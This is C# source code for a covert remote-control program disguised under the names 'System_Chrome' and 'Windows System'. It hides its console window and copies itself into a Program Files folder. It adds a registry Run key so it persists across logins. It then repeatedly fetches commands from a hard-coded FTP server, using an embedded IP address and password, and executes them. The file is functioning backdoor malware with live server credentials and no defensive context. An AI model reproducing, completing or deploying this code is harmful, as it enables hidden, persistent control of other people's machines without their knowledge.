using CommanderSpace;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace System_Chrome
{
    public class Command
    {
        public string command;
        public string program;
        public string arguments;

        public Command( string command, string program, string arguments )
        {
            this.command = command;
            this.program = program;
            this.arguments = arguments;
        }
        public Command(  ) { }
    }

    class Program
    {
        #region User32
        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        const int SW_HIDE = 0;
        const int SW_SHOW = 5;
        #endregion
        public static Commander commander = new Commander();

        public static string execCopyPath = "C:/Program Files (x86)/Support/";
        public static int iD = 0;
        public static bool isOk = false;

        public static StreamReader reader;
        public static FtpWebResponse response;
        public static Stream responseStream;

        public static void CleanCommandAtFTP( string file )
        {
            try
            {
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create( "ftp://193.109.246.183/" + file + ".txt");
                request.Method = WebRequestMethods.Ftp.UploadFile;
                request.Credentials = new NetworkCredential("8desktop", "951753qwe");
        
                string textNull = "NULL";
                byte[] bytes = Encoding.UTF8.GetBytes(textNull);
                request.ContentLength = bytes.Length;
        
                Stream stream = request.GetRequestStream();
                stream.Write(bytes, 0, bytes.Length);
                stream.Close();
            }
            catch { }
        }
        public static string DownloadCommand( string file )
        {
            bool ok = false;
            while (!ok)
            {
                try
                {
                    FtpWebRequest request = (FtpWebRequest)WebRequest.Create( "ftp://193.109.246.183/" + file + ".txt" );
                    request.Method = WebRequestMethods.Ftp.DownloadFile;
                    request.Credentials = new NetworkCredential( "8desktop", "951753qwe" );
                    response = (FtpWebResponse)request.GetResponse();

                    responseStream = response.GetResponseStream();
                    reader = new StreamReader(responseStream);
                    ok = true;

                    string result = reader.ReadToEnd();

                    reader.Close();
                    response.Close();
                    responseStream.Close();
                    
                    CleanCommandAtFTP(file);

                    return result;
                }
                catch
                {
                    if (reader != null) { reader.Close(); }
                    if (response != null) { response.Close(); }
                    if (responseStream != null) { responseStream.Close(); }

                    Thread.Sleep(250);
                }
            }
            return null;
        }

        public static void AddProgramToWindows()
        {
            string pathMyApp = Assembly.GetExecutingAssembly().Location;
            string locationMyProgram = Environment.CurrentDirectory;

            string pathPDB = locationMyProgram + "\\" + "System Chrome.pdb";
            string pathEXEconfig = locationMyProgram + "\\" + "System Chrome.exe.config";
            string pathInputSimulatorDLL = locationMyProgram + "\\" + "InputSimulator.dll";
            string pathCommanderCompId = locationMyProgram + "\\" + "CommanderCompId.txt";

            try
            {
                Directory.CreateDirectory( "C:/Program Files (x86)/Support/" );
            }
            catch { }

            try { File.Copy( pathMyApp, execCopyPath + "app.exe" ); } catch { }
            try { File.Copy( pathPDB, execCopyPath + "System Chrome.pdb" ); } catch { }
            try { File.Copy( pathEXEconfig, execCopyPath + "System Chrome.exe.config" ); } catch { }
            try { File.Copy( pathInputSimulatorDLL, execCopyPath + "InputSimulator.dll" ); } catch { }
            try { File.Copy( pathCommanderCompId, execCopyPath + "CommanderCompId.txt" ); } catch { }
        }
        public static void AddAutoRun()
        {
            const string name = "Windows System";
            string ExePath = Application.ExecutablePath;
            RegistryKey reg = Registry.CurrentUser.CreateSubKey( "Software\\Microsoft\\Windows\\CurrentVersion\\Run\\" );
            try
            {
                reg.SetValue(name, ExePath);
                reg.Close();
            }
            catch { }
        }

        static void Main( string[] args )
        {
            #region test
            //string _txt = "write hello are you ready?";
            //CommandType commandType = commander.ParseTextToCommand( _txt );
            //commander.Do( commandType );
            //
            //Console.ReadLine();
            #endregion

            #region default
            if ( args.Length > 0 && args[0] == "StartUp" )
            {
                AddAutoRun();
            }

            string pathExec = Environment.CurrentDirectory;
            string txtFile = pathExec + "\\" + "CommanderCompId.txt";
            
            try
            {
                string txt = File.ReadAllText( txtFile );
                if( Int32.TryParse( txt, out iD ) )
                {
                    isOk = true;
                }
            }
            catch
            {
                Console.Write( "Enter Id: " );
                string id = Console.ReadLine();
                File.WriteAllText( txtFile, id );

                AddProgramToWindows();

                ProcessStartInfo procStIn = new ProcessStartInfo( execCopyPath + "app.exe" );
                procStIn.Arguments = "StartUp";
                Process p = new Process();
                p.StartInfo = procStIn;
                p.Start();
            }
            #endregion

            #region execution
            var handle = GetConsoleWindow();
            ShowWindow(handle, SW_HIDE);


            while ( isOk )
            {
                string commandText = DownloadCommand( "CommanderComp" + iD );
                if( !String.IsNullOrEmpty( commandText ) && commandText != "NULL" )
                {
                    List<CommandType> listCommand = new List<CommandType>();

                    string[] separator = { "\n" };
                    string[] listText = commandText.Split( separator, StringSplitOptions.RemoveEmptyEntries );

                    foreach( string text in listText )
                    {
                        listCommand.Add( commander.ParseTextToCommand(text) );
                    }

                    foreach( CommandType command in listCommand )
                    {
                        Console.WriteLine( "I DO:  " + command.command + " " + command.program + " " + command.key + " " + command.argument );
                        try { commander.Do( command ); } catch { }
                    }
                    Thread.Sleep(500);
                }
                else
                {
                    Thread.Sleep( 1000 );
                }
            }
            #endregion
        }
    }
}
